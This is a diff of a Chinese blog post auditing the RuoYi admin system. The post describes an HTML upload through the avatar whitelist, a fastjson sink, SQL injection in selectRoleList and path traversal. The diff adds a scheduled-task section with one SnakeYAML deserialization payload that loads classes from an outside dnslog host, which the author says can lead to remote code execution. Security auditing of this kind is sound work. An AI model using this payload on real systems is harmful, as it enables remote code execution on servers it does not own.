@@ -140,7 +140,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://nbwsws.github.io/images/redefine-og.webp">
 <meta property="article:published_time" content="2025-07-30T02:02:03.464Z">
-<meta property="article:modified_time" content="2025-07-31T07:06:00.223Z">
+<meta property="article:modified_time" content="2025-08-01T01:53:40.332Z">
 <meta property="article:author" content="uwi">
 <meta property="article:tag" content="Cyber Security">
 <meta name="twitter:card" content="summary">
@@ -373,8 +373,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2025-07-31 15:06</span>
-            <span class="mobile">2025-07-31 15:06</span>
+            <span class="desktop">2025-08-01 09:53:40</span>
+            <span class="mobile">2025-08-01 09:53:40</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -402,40 +402,140 @@
 
 		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
 			<h1 id="头像处上传html"><a href="#头像处上传html" class="headerlink" title="头像处上传html"></a>头像处上传html</h1><p>头像上传的地方有个白名单</p>
-<p><img src="/../../images/image-20250728092330271.png" alt="image-20250728092330271"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../images/image-20250728092330271.png"
+                      alt="image-20250728092330271"
+                ></p>
 <p>这些后缀的文件都可以上传成功</p>
-<p><img src="/../../images/image-20250728092705360.png" alt="image-20250728092705360"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../images/image-20250728092705360.png"
+                      alt="image-20250728092705360"
+                ></p>
 <h1 id="fastjson漏洞审计流程"><a href="#fastjson漏洞审计流程" class="headerlink" title="fastjson漏洞审计流程"></a>fastjson漏洞审计流程</h1><p>检索JSONObject.parseObject 关键字发现在validateEdit函数里面运用了该函数</p>
 <p>options这个json对象是通过 JSON.toJSONString(genTable.getParams()) 生成的 我们需要知道genTable.getParams() 我们是否可控</p>
-<p><img src="/../../images/image-20250730101048826.png" alt="image-20250730101048826"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../images/image-20250730101048826.png"
+                      alt="image-20250730101048826"
+                ></p>
 <p>查看genTable.getParams() 方法 </p>
-<p><img src="/../../images/image-20250730101259771.png" alt="image-20250730101259771"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../images/image-20250730101259771.png"
+                      alt="image-20250730101259771"
+                ></p>
 <p>再查看validateEdit在哪里被执行了</p>
 <p>发现在&#x2F;edit这个接口实现函数上调用了这个函数 同时接口使用<code>@Validated</code>，说明会自动匹配客户端发送的参数变量与GenTable的属性进行匹配，如果匹配成功，参数将自动转化为GenTable的属性</p>
-<p><img src="/../../images/image-20250730101442721.png" alt="image-20250730101442721"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../images/image-20250730101442721.png"
+                      alt="image-20250730101442721"
+                ></p>
 <p>也就是说我们对参数是可控的</p>
 <p>我们找到业务接口 并尝试发包</p>
-<p><img src="/../../images/image-20250730101936752.png" alt="image-20250730101936752"></p>
-<p><img src="/../../images/image-20250730100448937.png" alt="image-20250730100448937"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../images/image-20250730101936752.png"
+                      alt="image-20250730101936752"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../images/image-20250730100448937.png"
+                      alt="image-20250730100448937"
+                ></p>
 <p>参数可控</p>
-<p><img src="/../../images/image-20250730100838208.png" alt="image-20250730100838208"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../images/image-20250730100838208.png"
+                      alt="image-20250730100838208"
+                ></p>
 <p>被防住了 如果版本低一点应该是可以的</p>
-<p><img src="/../../images/image-20250730105830786.png" alt="image-20250730105830786"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../images/image-20250730105830786.png"
+                      alt="image-20250730105830786"
+                ></p>
 <h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>发现参数拼接</p>
-<p><img src="/../../images/image-20250731102229223.png" alt="image-20250731102229223"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../images/image-20250731102229223.png"
+                      alt="image-20250731102229223"
+                ></p>
 <p>在selectRoleList 里被调用</p>
-<p><img src="/../../images/image-20250731102257228.png" alt="image-20250731102257228"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../images/image-20250731102257228.png"
+                      alt="image-20250731102257228"
+                ></p>
 <p>找到selectRoleList 函数被调用的位置 发现role参数可控</p>
-<p><img src="/../../images/image-20250731102416727.png" alt="image-20250731102416727"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../images/image-20250731102416727.png"
+                      alt="image-20250731102416727"
+                ></p>
 <p>构造报错数据包</p>
-<p><img src="/../../images/image-20250731103405583.png" alt="image-20250731103405583"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../images/image-20250731103405583.png"
+                      alt="image-20250731103405583"
+                ></p>
 <p>发现确实存在注入</p>
-<p><img src="/../../images/image-20250731103555789.png" alt="image-20250731103555789"></p>
-<p><img src="/../../images/image-20250731103617655.png" alt="image-20250731103617655"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../images/image-20250731103555789.png"
+                      alt="image-20250731103555789"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../images/image-20250731103617655.png"
+                      alt="image-20250731103617655"
+                ></p>
 <p>还有好几个sql注入点 不一一列举了</p>
 <h1 id="任意文件读取漏洞"><a href="#任意文件读取漏洞" class="headerlink" title="任意文件读取漏洞"></a>任意文件读取漏洞</h1><p>没过滤 ..&#x2F;..&#x2F;</p>
-<p><img src="/../../images/image-20250728105112168.png" alt="image-20250728105112168"></p>
-<p><img src="/../../images/image-20250728105044257.png" alt="image-20250728105044257"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../images/image-20250728105112168.png"
+                      alt="image-20250728105112168"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../images/image-20250728105044257.png"
+                      alt="image-20250728105044257"
+                ></p>
+<h1 id="定时任务漏洞"><a href="#定时任务漏洞" class="headerlink" title="定时任务漏洞"></a>定时任务漏洞</h1><p>结合org.yaml.snakeyaml.Yaml.load 打个dnslog 证明漏洞存在 其实可以rce的</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:\Users\89135\Desktop\blog\myblog\source\images../../images/.png"
+                      alt="..&#x2F;..&#x2F;images&#x2F;"
+                ></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.yaml.snakeyaml.Yaml.load(&#x27;!!javax.script.ScriptEngineManager  [!!java.net.URLClassLoader [[!!java.net.URL [&quot;ftp://asizby.dnslog.cn&quot;]]]]&#x27;)</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:\Users\89135\Desktop\blog\myblog\source\images\image-20250801092301780.png"
+                      alt="image-20250801092301780"
+                ></p>
 
 		</div>
 
@@ -450,7 +550,7 @@
         
             <li>
                 <strong>Updated at
-                    :</strong> 2025-07-31 15:06:00
+                    :</strong> 2025-08-01 09:53:40
             </li>
         
         <li>
@@ -546,7 +646,7 @@
 	<div class="post-toc">
 		<div class="toc-title">On this page</div>
 		<div class="page-title">若依系统代码审计</div>
-		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A4%B4%E5%83%8F%E5%A4%84%E4%B8%8A%E4%BC%A0html"><span class="nav-text">头像处上传html</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#fastjson%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1%E6%B5%81%E7%A8%8B"><span class="nav-text">fastjson漏洞审计流程</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="nav-text">sql注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E"><span class="nav-text">任意文件读取漏洞</span></a></li></ol>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A4%B4%E5%83%8F%E5%A4%84%E4%B8%8A%E4%BC%A0html"><span class="nav-text">头像处上传html</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#fastjson%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1%E6%B5%81%E7%A8%8B"><span class="nav-text">fastjson漏洞审计流程</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="nav-text">sql注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E"><span class="nav-text">任意文件读取漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%BC%8F%E6%B4%9E"><span class="nav-text">定时任务漏洞</span></a></li></ol>
 
 	</div>
 </div>
